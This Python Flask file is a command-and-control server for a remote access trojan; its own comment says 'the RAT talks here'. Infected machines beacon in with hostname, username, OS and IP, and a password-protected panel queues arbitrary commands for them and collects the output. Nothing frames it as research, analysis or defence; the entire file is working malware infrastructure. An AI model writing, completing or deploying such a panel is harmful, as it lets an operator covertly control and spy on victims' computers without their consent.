from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from functools import wraps
import secrets
import time
from datetime import datetime

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# Change this password
ADMIN_PASS = "rodriogfiodjxa"

# In-memory store (resets on sleep/restart — fine for first version)
agents = {}          # agent_id -> info
tasks = {}           # agent_id -> list of pending tasks
results = {}         # task_id -> result

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("password") == ADMIN_PASS:
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        return render_template("login.html", error="Wrong password")
    return render_template("login.html")

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

@app.route("/")
@login_required
def dashboard():
    # mark offline if no beacon for 90s
    now = time.time()
    for aid, info in agents.items():
        info["online"] = (now - info.get("last_seen", 0)) < 90
    return render_template("index.html", agents=agents)

# ---------- Agent API (the RAT talks here) ----------

@app.route("/api/beacon", methods=["POST"])
def beacon():
    data = request.json or {}
    aid = data.get("id")
    if not aid:
        return jsonify({"error": "no id"}), 400

    agents[aid] = {
        "id": aid,
        "hostname": data.get("hostname", "unknown"),
        "username": data.get("username", "unknown"),
        "os": data.get("os", "unknown"),
        "ip": request.remote_addr,
        "last_seen": time.time(),
        "online": True,
        "first_seen": agents.get(aid, {}).get("first_seen", time.time())
    }

    # return pending tasks
    pending = tasks.get(aid, [])
    tasks[aid] = []
    return jsonify({"tasks": pending})

@app.route("/api/result", methods=["POST"])
def result():
    data = request.json or {}
    tid = data.get("task_id")
    results[tid] = {
        "output": data.get("output", ""),
        "time": time.time()
    }
    return jsonify({"ok": True})

# ---------- Panel actions ----------

@app.route("/api/task", methods=["POST"])
@login_required
def create_task():
    data = request.json or {}
    aid = data.get("agent_id")
    cmd = data.get("cmd")
    if not aid or not cmd:
        return jsonify({"error": "missing"}), 400

    tid = secrets.token_hex(8)
    task = {"id": tid, "cmd": cmd, "created": time.time()}
    tasks.setdefault(aid, []).append(task)
    return jsonify({"task_id": tid})

@app.route("/api/agents")
@login_required
def list_agents():
    now = time.time()
    out = []
    for aid, info in agents.items():
        info["online"] = (now - info.get("last_seen", 0)) < 90
        out.append(info)
    return jsonify(out)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
